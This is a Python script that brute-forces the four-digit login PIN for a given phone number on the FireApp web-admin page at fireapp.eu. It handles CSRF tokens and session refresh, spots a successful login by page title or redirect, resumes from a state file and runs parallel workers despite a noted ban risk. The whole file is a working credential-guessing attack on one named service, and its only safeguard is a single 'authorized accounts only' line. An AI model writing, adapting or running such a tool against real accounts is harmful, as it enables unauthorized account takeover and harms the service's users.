#!/usr/bin/env python3
"""
FireApp web-admin PIN brute-forcer.
Targets https://fireapp.eu/user/login.php (telefon + PIN).
Use only on accounts you are authorized to test.

Usage:
    python3 fireapp_webpin_brute.py --telefon 041112112 --start 0000 --end 9999 --delay 0.8 --workers 1
"""
import argparse, os, re, sys, time
from concurrent.futures import ThreadPoolExecutor, as_completed

import httpx

FA = "https://fireapp.eu"
LOGIN_URL = f"{FA}/user/login.php"
REF = f"{FA}/user/login.php"


def get_csrf(client: httpx.Client) -> tuple[str, httpx.Cookies]:
    r = client.get(LOGIN_URL, timeout=15)
    m = re.search(r'name=["\']?eg-csrf-token-label["\']?\\s+value=["\']([^"\']+)["\']', r.text)
    if not m:
        m = re.search(r'value=["\']([^"\']+)["\']\\s+name=["\']?eg-csrf-token-label["\']?', r.text)
    csrf = m.group(1) if m else ""
    return csrf, r.cookies


def try_pin(client: httpx.Client, telefon: str, pin: str, csrf: str, cookies: httpx.Cookies) -> dict:
    body = f"telefon={telefon}&pin={pin}&eg-csrf-token-label={csrf}"
    r = client.post(
        LOGIN_URL,
        content=body,
        headers={"Content-Type": "application/x-www-form-urlencoded", "Referer": REF},
        cookies=cookies,
        follow_redirects=True,
        timeout=15,
    )
    title_m = re.search(r"<title>(.*?)</title>", r.text, re.I)
    title = title_m.group(1).strip() if title_m else "no title"
    path = r.url.path
    snippet = re.sub(r"\s+", " ", r.text)[:200]
    return {
        "pin": pin,
        "status": r.status_code,
        "title": title,
        "path": path,
        "len": len(r.text),
        "snippet": snippet,
    }


def is_success(res: dict) -> bool:
    # Success criteria: title changes from login page or redirect away from /user/login.php
    return res["title"] != "FireApp | LOGIN" or res["path"] != "/user/login.php"


def worker_range(telefon: str, start: int, end: int, delay: float, state_file: str):
    with httpx.Client(http2=False, follow_redirects=True) as client:
        csrf, cookies = get_csrf(client)
        if not csrf:
            print("[!] CSRF token not found; aborting.")
            return None
        for pin_int in range(start, end):
            pin = f"{pin_int:04d}"
            try:
                res = try_pin(client, telefon, pin, csrf, cookies)
                if is_success(res):
                    print(f"\n[+] SUCCESS: pin={pin}")
                    print(f"    title={res['title']} path={res['path']} len={res['len']}")
                    return pin
                # Refresh CSRF/cookies periodically to avoid stale session
                if pin_int % 200 == 0 and pin_int != start:
                    csrf, cookies = get_csrf(client)
                if pin_int % 100 == 0:
                    print(f"[-] progress: {pin} ({pin_int - start}/{end - start})")
                    if state_file:
                        with open(state_file, "w") as f:
                            f.write(pin)
            except Exception as e:
                print(f"\n[!] error at {pin}: {e}")
            time.sleep(delay)
    return None


def main():
    parser = argparse.ArgumentParser(description="FireApp web-admin PIN brute-forcer")
    parser.add_argument("--telefon", required=True, help="Target phone number (e.g. 041112112)")
    parser.add_argument("--start", type=int, default=0, help="Start PIN (integer)")
    parser.add_argument("--end", type=int, default=10000, help="End PIN (exclusive)")
    parser.add_argument("--delay", type=float, default=0.8, help="Seconds between attempts")
    parser.add_argument("--workers", type=int, default=1, help="Parallel workers (increase = higher ban risk)")
    parser.add_argument("--state", default=".fireapp_brute_state", help="Resume state file")
    args = parser.parse_args()

    if os.path.exists(args.state):
        with open(args.state) as f:
            last = f.read().strip()
        try:
            args.start = max(args.start, int(last) + 1)
            print(f"[*] Resuming from PIN {args.start:04d}")
        except ValueError:
            pass

    total = args.end - args.start
    eta_min = total * args.delay / 60.0
    print(f"[*] Target: {args.telefon}")
    print(f"[*] Range: {args.start:04d} - {args.end - 1:04d} ({total} pins)")
    print(f"[*] Delay: {args.delay}s | Workers: {args.workers} | ETA: {eta_min:.1f} min")
    print(f"[*] State file: {args.state}\n")

    if args.workers == 1:
        found = worker_range(args.telefon, args.start, args.end, args.delay, args.state)
        if found:
            print(f"\n[+] PIN found: {found}")
            sys.exit(0)
    else:
        chunk = (total + args.workers - 1) // args.workers
        ranges = [(args.start + i * chunk, min(args.start + (i + 1) * chunk, args.end)) for i in range(args.workers)]
        with ThreadPoolExecutor(max_workers=args.workers) as ex:
            futures = {ex.submit(worker_range, args.telefon, s, e, args.delay, args.state): (s, e) for s, e in ranges}
            for fut in as_completed(futures):
                result = fut.result()
                if result:
                    print(f"\n[+] PIN found: {result}")
                    ex.shutdown(wait=False, cancel_futures=True)
                    sys.exit(0)

    print("\n[-] PIN not found in range")


if __name__ == "__main__":
    main()
